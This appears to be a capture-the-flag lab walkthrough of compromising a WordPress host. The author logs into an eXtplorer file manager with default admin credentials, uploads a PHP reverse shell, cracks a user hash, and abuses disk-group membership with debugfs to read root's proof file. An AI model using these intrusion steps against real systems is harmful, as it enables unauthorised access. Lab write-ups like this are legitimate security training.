Starting with nmap scan

This is a wordpress application. Let's continue with enumeration

## 2. Initial Foothold

I initially started with nmap wordpress scan.
```
┌──(hlee㉿kali)-[~]
└─$ sudo nmap 192.168.155.16 -p80 -T4 --script=http-wordpress-*

```
I found akismet 5.1 plugin, but nothing useful I guess.

If I try to set the config like this:
![image](../contentImages/extplorer/4.png)

Error pops up because server doesnt have sql service running. I opened port 8000 and tried it once more with MY_IP:8000
```
┌──(hlee㉿kali)-[~]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.45.192] from (UNKNOWN) [192.168.155.16] 41808
```
So it actually tries to connect us. But naturally it isn't a shell. Dead end here.

I found with ffuf an interesting endpoint, /filemanager. As I visited:
![image](../contentImages/extplorer/5.png)
Our machine name was kind of a straight hint I guess. There were several exploits for extplorer. Since we don't have a version name, we need to brute-force for a little bit.

We could log in with default credential admin:admin.
![image](../contentImages/extplorer/6.png)

We can see every files under /wp-admin and also can upload a file. If we can upload a php file and also **access** it, we can simply upload a revshell! I uploaded revshell.php which I created with Reverse shell generator and visited

> 192.168.155.16/wp-admin/revshell.php

Then I got a shell!
```

But I still can't get local.txt.

## 3. PrivEsc to dora

![image](../contentImages/extplorer/7.png)
We found a hash for dora user at our extplorer application, under /filemanager/xxxx/...(find it yourself!). Let's try to crack it!

```

```
doaremon is actually my favorite character :)

Then I did su dora.

## 4. PrivEsc to root

I found that dora is:
```
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```
disk group is not a normal one. Let's google about it.

![image](../contentImages/extplorer/8.png)
It's **almost** root privilege, it says! Let's follow the steps and gain root privilege
```
dora@dora:/$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
...
```
I assumed that the first Filesystem is our mounted "/".
```
dora@dora:/$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs:  cd /root
debugfs:  ls
ls
 131076  (12) .    2  (12) ..    265478  (12) .ssh    265574  (12) snap   
 131077  (16) .bashrc    131078  (16) .profile    142303  (24) .bash_history   
 265709  (16) .cache    265469  (36) .local    132363  (20) proof.txt   
 132531  (3908) flag4.txt   
debugfs:  cat proof.txt
cat proof.txt
5afd64bd1c723ea7f400751b13d9ad05
```
Done!

Lesson learned: check for group privilege! (bad habit: only checking for sudo -l, pspy and suid permission)
